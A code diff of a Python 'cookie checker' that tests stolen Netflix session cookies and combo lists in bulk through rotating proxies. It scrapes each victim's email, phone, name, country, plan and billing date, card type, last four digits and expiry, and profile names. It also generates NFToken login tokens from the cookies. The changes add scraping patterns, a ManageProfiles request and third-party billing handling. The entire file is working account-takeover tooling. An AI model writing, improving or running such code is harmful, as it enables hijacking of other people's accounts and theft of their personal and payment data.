@@ -8,8 +8,7 @@ from typing import Optional
 from datetime import datetime
 
 # ---------------------------------------------------------------------------
-# Proxy manager — rotating proxy pool for IP rotation / ban protection.
-# Zero-config by default; add proxies via PROXY_LIST env var or proxies.txt.
+# Proxy manager — pool rotativo de proxies
 # ---------------------------------------------------------------------------
 try:
     from proxy_manager import proxy_manager as _proxy_manager
@@ -33,29 +32,40 @@ logger.setLevel(logging.WARNING)
 
 
 # ---------------------------------------------------------------------------
-# JS hex-escape decoder (Netflix uses \xNN sequences in inline JS)
+# Decodificadores y limpiadores de cadenas
 # ---------------------------------------------------------------------------
 
 def _decode_js_hex(s: str) -> str:
-    """Convert JavaScript \\xNN hex escape sequences to real characters."""
+    """Convierte secuencias de escape hexadecimales de JS \\xNN a caracteres reales."""
     return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
 
 
-def _clean_price(s: str) -> str:
-    """Decode unicode currency symbols and clean up price strings."""
+def _decode_unicode_escapes(s: str) -> str:
+    """Decodifica secuencias \\uXXXX a caracteres y emojis reales (ej. \\uD83D\\uDEA9 -> 🚩)."""
     if not s:
         return s
     if '\\u' in s or '\\U' in s:
         try:
-            s = s.encode('ascii').decode('unicode_escape')
+            s = s.encode('raw_unicode_escape').decode('unicode_escape')
         except Exception:
-            pass
+            try:
+                s = s.encode('ascii').decode('unicode_escape')
+            except Exception:
+                pass
+    return s
+
+
+def _clean_price(s: str) -> str:
+    """Decodifica símbolos monetarios y limpia cadenas de precios."""
+    if not s:
+        return s
+    s = _decode_unicode_escapes(s)
     s = s.replace('\u00a0', ' ').replace('\xa0', ' ').strip()
     return s
 
 
 # ---------------------------------------------------------------------------
-# Netflix page data helpers
+# Procesamiento de respuestas y datos de Netflix
 # ---------------------------------------------------------------------------
 
 def _extract_reactcontext(html: str) -> dict:
@@ -102,11 +112,8 @@ def _parse_date(val) -> str:
     if not val:
         return ""
     s = str(val).strip().rstrip("Z")
-    try:
-        s = s.encode("raw_unicode_escape").decode("unicode_escape")
-    except Exception:
-        pass
-    s = s.replace("\\x20", " ").replace("\\u0020", " ").replace("&nbsp;", " ").strip()
+    s = _decode_unicode_escapes(s)
+    s = s.replace("\\x20", " ").replace("&nbsp;", " ").strip()
 
     if re.search(r'[A-Za-z]', s) and re.search(r'\d', s):
         m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
@@ -238,7 +245,7 @@ NFTOKEN_HEADERS = {
 
 
 # ---------------------------------------------------------------------------
-# Combo / pipe-delimited parser
+# Parsers de combos y cookies
 # ---------------------------------------------------------------------------
 
 def is_combo_line(text: str) -> bool:
@@ -310,10 +317,6 @@ def parse_combo_line(line: str) -> dict | None:
         return None
     return result
 
-
-# ---------------------------------------------------------------------------
-# Cookie parsers
-# ---------------------------------------------------------------------------
 
 def parse_netscape_cookies(text: str) -> dict:
     cookies = {}
@@ -465,7 +468,7 @@ def extract_file_metadata(text: str) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# NFToken generator (Actualizado para reportar el motivo exacto en el ZIP)
+# Generador NFToken (con reporte detallado de error y soporte a proxies)
 # ---------------------------------------------------------------------------
 
 def generate_nftoken(cookies: dict) -> dict:
@@ -477,7 +480,6 @@ def generate_nftoken(cookies: dict) -> dict:
     if not netflix_id:
         return {"success": False, "error": "Cookie NetflixId no encontrada"}
 
-    # Construir cabecera enviando ambas cookies para autorizar la emisión de token
     cookie_parts = [f"NetflixId={netflix_id}"]
     sec_id = (
         cookies.get("SecureNetflixId")
@@ -493,7 +495,6 @@ def generate_nftoken(cookies: dict) -> dict:
 
     headers = {**NFTOKEN_HEADERS, "Cookie": cookie_header}
 
-    # Intentos: primero directo; si falla con 502/403/timeout y hay proxy disponible, reintenta
     attempts = [None]
     if _PROXY_ENABLED and _proxy_manager and _proxy_manager.enabled:
         p = _proxy_manager.get_proxies_dict()
@@ -531,7 +532,6 @@ def generate_nftoken(cookies: dict) -> dict:
                 raw_snippet = resp.text.replace("\n", " ")[:70] if resp.text else "Respuesta vacía"
                 return {"success": False, "error": f"Respuesta no JSON: {raw_snippet}"}
 
-            # ── 1. Búsqueda exhaustiva del token ──────────────────────────────
             token = None
             expires = None
 
@@ -568,7 +568,6 @@ def generate_nftoken(cookies: dict) -> dict:
                     "error": None,
                 }
 
-            # ── 2. Extracción del motivo real para mostrarlo en el archivo del ZIP ──
             def _find_falcor_error(obj, depth=0):
                 if depth > 7:
                     return None
@@ -614,7 +613,7 @@ def generate_nftoken(cookies: dict) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# Targeted field extractors
+# Extractores de campos
 # ---------------------------------------------------------------------------
 
 def _brace_extract(html: str, start_pos: int) -> dict | list | None:
@@ -714,6 +713,10 @@ def _extract_member_plan(html: str) -> dict:
 def _extract_billing_date_from_html(html: str) -> str:
     html_decoded = _decode_js_hex(html)
     patterns = [
+        r'data-uia="nextBillingDate-item"[^>]*>([^<]+)<',
+        r'data-uia="account-billing-date"[^>]*>([^<]+)<',
+        r'"localizedNextBillingDate"\s*:\s*"([^"]+)"',
+        r'"nextBillingDateFormatted"\s*:\s*"([^"]+)"',
         r'"nextBillingDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
         r'"nextBillingDate"\s*:\s*\{\s*"value"\s*:\s*"([^"]+)"',
         r'"renewalDate"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
@@ -723,7 +726,7 @@ def _extract_billing_date_from_html(html: str) -> str:
     for pat in patterns:
         for m in re.finditer(pat, html_decoded, re.IGNORECASE):
             candidate = m.group(1).strip()
-            if '{' in candidate or '}' in candidate or candidate == 'null':
+            if '{' in candidate or '}' in candidate or candidate.lower() in ('null', 'unknown', 'undefined'):
                 continue
             result = _parse_date(candidate)
             if result:
@@ -734,6 +737,7 @@ def _extract_billing_date_from_html(html: str) -> str:
 def _extract_price_from_html(html: str) -> str:
     html_decoded = _decode_js_hex(html)
     patterns = [
+        r'data-uia="plan-price"[^>]*>([^<]+)<',
         r'"formattedPlanPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
         r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
         r'"planPrice"\s*:\s*\{"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*([0-9.]+)',
@@ -744,7 +748,7 @@ def _extract_price_from_html(html: str) -> str:
         m = re.search(pat, html_decoded, re.IGNORECASE)
         if m:
             raw = m.group(1).strip()
-            if raw and raw != 'null':
+            if raw and raw.lower() not in ('null', 'undefined', 'unknown'):
                 return _clean_price(raw)
     return ""
 
@@ -781,7 +785,6 @@ def _extract_payment_info(html: str) -> dict:
         last_four = fv("cardLastFour") or fv("lastFourDigits") or fv("lastFour")
         exp_mo = fv("cardExpirationMonth")
         exp_yr = fv("cardExpirationYear")
-        is_exp = fv("isExpired")
         alt_method = fv("paymentMethod")
         display_text = fv("displayText")
 
@@ -837,24 +840,51 @@ def _extract_payment_info(html: str) -> dict:
 
 
 def _extract_profiles_list(html: str) -> tuple[list[str], int]:
-    """
-    Extract profile names and total profile count from the page.
-    Returns (names_list, total_count).
-    total_count comes from the profiles __ref array (accurate even when
-    only the active profile's name is visible on the membership page).
-    """
+    """Extrae perfiles decodificando emojis y analizando tanto JSON como elementos HTML."""
+    if not html:
+        return [], 0
+
     html_decoded = _decode_js_hex(html)
     names = []
     seen = set()
 
-    # Extract any visible profile names
-    for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,60})"', html_decoded):
-        name = m.group(1).strip()
-        if name and name not in seen:
-            seen.add(name)
-            names.append(name)
+    def _add_name(candidate: str):
+        c = _decode_unicode_escapes(candidate).strip()
+        if c and c.lower() not in ("null", "undefined", "true", "false", ""):
+            if c not in seen:
+                seen.add(c)
+                names.append(c)
 
-    # Count from the profiles __ref array (most reliable count)
+    # 1. netflix.reactContext
+    ctx = _extract_reactcontext(html)
+    if ctx:
+        models = ctx.get("models", {})
+        prof_data = (
+            models.get("profilesList", {}).get("data")
+            or models.get("profiles", {}).get("data")
+            or models.get("allProfiles", {}).get("data")
+        )
+        if isinstance(prof_data, list):
+            for p in prof_data:
+                if isinstance(p, dict):
+                    pname = str(p.get("profileName") or p.get("name") or "")
+                    _add_name(pname)
+
+    # 2. JSON regex
+    for m in re.finditer(r'"profileName"\s*:\s*"([^"]{1,80})"', html_decoded):
+        _add_name(m.group(1))
+
+    # 3. HTML tags visibles
+    html_patterns = [
+        r'class="profile-name"[^>]*>([^<]+)<',
+        r'data-uia="profile-name"[^>]*>([^<]+)<',
+        r'<span class="profile-name">([^<]+)</span>',
+        r'class="profile-link"[^>]*title="([^"]+)"',
+    ]
+    for pat in html_patterns:
+        for m in re.finditer(pat, html_decoded):
+            _add_name(m.group(1))
+
     total_count = len(names)
     m = re.search(r'"profiles"\s*:\s*(\[)', html_decoded)
     if m:
@@ -994,7 +1024,7 @@ def _extract_email_verified(html: str) -> bool | None:
 
 
 # ---------------------------------------------------------------------------
-# Main cookie checker
+# Verificador de cookies principal
 # ---------------------------------------------------------------------------
 
 _tl_session = _threading.local()
@@ -1059,7 +1089,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
 
     _proxy_timeout  = 2 if bulk_mode else 3
     _direct_timeout = 5 if bulk_mode else 7
-    _timeout = _direct_timeout
     session, using_curl = _make_session(bulk_mode)
 
     nft_result: dict = {"success": False, "error": "skipped"}
@@ -1179,8 +1208,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             return {"status": "error", "message": "Could not reach Netflix account page."}
 
         account_html = acct_text
-        browse_html  = ""
-
         result: dict = {"status": "hit"}
 
         result["netflix_id"]        = cookies.get("NetflixId", "")
@@ -1189,8 +1216,9 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
         result["phone"]             = file_meta.get("phone") or ""
         result["password"]          = file_meta.get("password") or ""
 
-        userinfo = _extract_userinfo(account_html) or _extract_userinfo(browse_html)
+        userinfo = _extract_userinfo(account_html)
 
+        # ── Estado de membresía ───────────────────────────────────────────────
         ms_status = ""
         if userinfo:
             ms_status = (userinfo.get("membershipStatus") or "").upper()
@@ -1210,6 +1238,7 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
         result["membership_status"] = ms_status or "Unknown"
         result["is_in_free_trial"]  = userinfo.get("isInFreeTrial", False) if userinfo else False
 
+        # ── Problemas y alertas de la cuenta ──────────────────────────────────
         issues = _detect_account_issues(account_html)
         try:
             _pre = _pre_issue
@@ -1219,6 +1248,7 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             pass
         result["account_issues"] = issues
 
+        # ── Correo electrónico ────────────────────────────────────────────────
         email = None
         if userinfo:
             raw_email = userinfo.get("emailAddress") or userinfo.get("email")
@@ -1237,26 +1267,29 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                         email = cand
                         break
         result["email"] = email or file_meta.get("email") or "Hidden"
-
         result["email_verified"] = _extract_email_verified(account_html)
 
+        # ── Nombre del titular ────────────────────────────────────────────────
         name = file_meta.get("name") or ""
         if not name and userinfo:
             raw_name = userinfo.get("name") or userinfo.get("firstName") or userinfo.get("displayName")
             if raw_name:
                 cand = str(raw_name).strip()
-                if not any(x in cand.lower() for x in ("netflix", "plan", "standard", "premium", "basic", "mobile")):
+                # Descarta si el titular es simplemente "1" o números de telemetría
+                if cand not in ("1", "null", "undefined") and not cand.isdigit() and not any(x in cand.lower() for x in ("netflix", "plan", "standard", "premium", "basic", "mobile")):
                     name = cand
         result["name"] = name or ""
 
+        # ── Teléfono ──────────────────────────────────────────────────────────
         if not result["phone"]:
-            result["phone"] = _extract_phone(account_html) or _extract_phone(browse_html) or ""
+            result["phone"] = _extract_phone(account_html) or ""
 
-        plan_info = _extract_member_plan(account_html) or _extract_member_plan(browse_html)
+        # ── Plan y calidad ────────────────────────────────────────────────────
+        plan_info = _extract_member_plan(account_html)
 
-        plan_name  = plan_info.get("plan_name")  or file_meta.get("plan_name") or ""
-        quality    = plan_info.get("quality")    or file_meta.get("quality")   or ""
-        max_streams= plan_info.get("max_streams")or file_meta.get("max_streams") or ""
+        plan_name   = plan_info.get("plan_name")   or file_meta.get("plan_name")   or ""
+        quality     = plan_info.get("quality")     or file_meta.get("quality")     or ""
+        max_streams = plan_info.get("max_streams") or file_meta.get("max_streams") or ""
 
         if plan_name and (not quality or not max_streams):
             for key, info in PLAN_MAP.items():
@@ -1286,6 +1319,7 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             if not any("on hold" in i.lower() for i in existing):
                 result["account_issues"] = list(existing) + ["Account on hold (payment failed)"]
 
+        # ── País ──────────────────────────────────────────────────────────────
         country = None
         if userinfo:
             country = userinfo.get("countryOfSignup") or userinfo.get("memberCountry")
@@ -1298,6 +1332,7 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                     break
         result["country"] = country or file_meta.get("country") or "Unknown"
 
+        # ── Miembro desde ─────────────────────────────────────────────────────
         member_since = None
         if userinfo:
             raw = userinfo.get("memberSince") or userinfo.get("joinDate") or userinfo.get("startDate")
@@ -1313,21 +1348,8 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                         break
         result["member_since"] = member_since or file_meta.get("member_since") or "Unknown"
 
-        next_billing = (plan_info.get("next_billing")
-                        or _extract_billing_date_from_html(account_html)
-                        or _extract_billing_date_from_html(browse_html)
-                        or file_meta.get("next_billing") or "")
-        if result["status"] == "free":
-            next_billing = next_billing or "N/A (cancelled)"
-        result["next_billing"] = next_billing or "Unknown"
-
-        price_raw = (plan_info.get("price")
-                     or _extract_price_from_html(account_html)
-                     or _extract_price_from_html(browse_html)
-                     or file_meta.get("price") or "")
-        result["price"] = _clean_price(price_raw) if price_raw else "Unknown"
-
-        pay_info = _extract_payment_info(account_html) or _extract_payment_info(browse_html)
+        # ── Pago y Facturación ────────────────────────────────────────────────
+        pay_info = _extract_payment_info(account_html)
         payment  = pay_info.get("payment") or ""
         if not payment:
             html_decoded = _decode_js_hex(account_html)
@@ -1337,46 +1359,87 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
                 if m:
                     payment = m.group(1).strip()
                     break
-        result["payment"]      = payment or file_meta.get("payment") or "Unknown"
-        result["card_type"]    = pay_info.get("card_type")   or ""
-        result["card_last4"]   = pay_info.get("card_last4")  or ""
-        result["card_expiry"]  = pay_info.get("card_expiry") or ""
-        result["card_expired"] = pay_info.get("card_expired", False)
+        result["payment"]       = payment or file_meta.get("payment") or "Unknown"
+        result["card_type"]     = pay_info.get("card_type")   or ""
+        result["card_last4"]    = pay_info.get("card_last4")  or ""
+        result["card_expiry"]   = pay_info.get("card_expiry") or ""
+        result["card_expired"]  = pay_info.get("card_expired", False)
         result["is_third_party"]= pay_info.get("is_third_party", False)
-        result["partner_name"] = pay_info.get("partner_name") or ""
+        result["partner_name"]  = pay_info.get("partner_name") or ""
 
-               # 1. Si el nombre quedó como "1" o número, se limpia para que el bot tome el del correo
-        if str(result.get("name", "")).strip() in ("1", "null", "undefined") or str(result.get("name", "")).strip().isdigit():
-            result["name"] = ""
+        # Próxima facturación
+        next_billing = (
+            plan_info.get("next_billing")
+            or _extract_billing_date_from_html(account_html)
+            or file_meta.get("next_billing")
+            or ""
+        )
+        if result["status"] == "free":
+            next_billing = next_billing or "N/A (cancelled)"
+        result["next_billing"] = next_billing or "Unknown"
 
-        # 2. Consultar perfiles reales si aún no se han obtenido
-        pnames, pcount = _extract_profiles_list(browse_html or account_html)
-        if not pnames or pcount == 0:
+        # Precio
+        price_raw = (
+            plan_info.get("price")
+            or _extract_price_from_html(account_html)
+            or file_meta.get("price")
+            or ""
+        )
+        result["price"] = _clean_price(price_raw) if price_raw else "Unknown"
+
+        # Respaldo para facturación por terceros (IndiHome, Spark NZ, etc.)
+        partner_label = result["partner_name"]
+        card_t = str(result["card_type"])
+        pay_t = str(result["payment"])
+        is_3rd = result["is_third_party"] or bool(partner_label) or "3rd party" in pay_t.lower() or "3rd party" in card_t.lower()
+
+        if is_3rd:
+            prov = partner_label or card_t.split("(")[0].strip() or pay_t.split("(")[0].strip() or "Terceros"
+            if result["next_billing"] in ("Unknown", "Desconocido", None, ""):
+                result["next_billing"] = f"Facturado por {prov}"
+            if result["price"] in ("Unknown", "Desconocido", None, ""):
+                result["price"] = f"Incluido con {prov}"
+
+        # ── Perfiles reales (Consulta ManageProfiles / browse) ────────────────
+        pnames = []
+        pcount = 0
+        try:
+            r_prof = session.get(
+                "https://www.netflix.com/ManageProfiles",
+                cookies=cookies,
+                timeout=4,
+                allow_redirects=True
+            )
+            if r_prof.status_code == 200 and len(r_prof.text) > 1000:
+                pnames, pcount = _extract_profiles_list(r_prof.text)
+        except Exception:
+            pass
+
+        # Si ManageProfiles no respondió o no dio perfiles, probar /browse
+        if not pnames and pcount <= 1:
             try:
-                r_br = session.get("https://www.netflix.com/browse", cookies=cookies, timeout=4, allow_redirects=True)
+                r_br = session.get(
+                    "https://www.netflix.com/browse",
+                    cookies=cookies,
+                    timeout=4,
+                    allow_redirects=True
+                )
                 if r_br.status_code == 200 and len(r_br.text) > 1000:
-                    pnames, pcount = _extract_profiles_list(r_br.text)
+                    br_names, br_count = _extract_profiles_list(r_br.text)
+                    if br_names or br_count > pcount:
+                        pnames, pcount = br_names, br_count
             except Exception:
                 pass
 
-        # Filtrar el "1" falso de la lista de perfiles
-        clean_pnames = [p for p in pnames if str(p).strip() not in ("1", "null") and not str(p).strip().isdigit()]
-        result["profile_names"] = clean_pnames
-        result["profile_count"] = pcount if pcount > 0 else (len(clean_pnames) if clean_pnames else 1)
-        result["profiles"] = result["profile_count"]
+        # Si ninguno dio perfiles, usar el respaldo de account_html
+        if not pnames and pcount == 0:
+            pnames, pcount = _extract_profiles_list(account_html)
 
-        # 3. Asignar operador en facturación por terceros (Spark NZ, IndiHome, etc.) para quitar el Unknown
-        partner = result.get("partner_name") or ""
-        card_t = str(result.get("card_type") or "")
-        pay_t = str(result.get("payment") or "")
-        is_3rd = result.get("is_third_party") or bool(partner) or "3rd party" in pay_t.lower() or "3rd party" in card_t.lower()
-        if is_3rd:
-            prov = partner or card_t.split("(")[0].strip() or pay_t.split("(")[0].strip() or "Terceros"
-            if result.get("next_billing") in ("Unknown", "Desconocido", None, ""):
-                result["next_billing"] = f"Facturado por {prov}"
-            if result.get("price") in ("Unknown", "Desconocido", None, ""):
-                result["price"] = f"Incluido con {prov}"
+        result["profile_names"] = pnames
+        result["profile_count"] = pcount if pcount > 0 else (len(pnames) if pnames else 1)
+        result["profiles"]      = result["profile_count"]
 
+        # ── Comprobación final de cuenta en espera (On Hold) ──────────────────
         if result["status"] == "hit" and (result["is_on_hold"] or
                 "on hold" in account_html.lower() or "payment hold" in account_html.lower()):
             result["status"] = "on_hold"
@@ -1398,7 +1461,6 @@ def check_cookie(cookie_text: str, generate_token: bool = True, bulk_mode: bool 
             result["account_issues"] = [_sync_msg]
 
         result["nftoken"] = nft_result
-
         return result
 
     except requests.exceptions.Timeout:
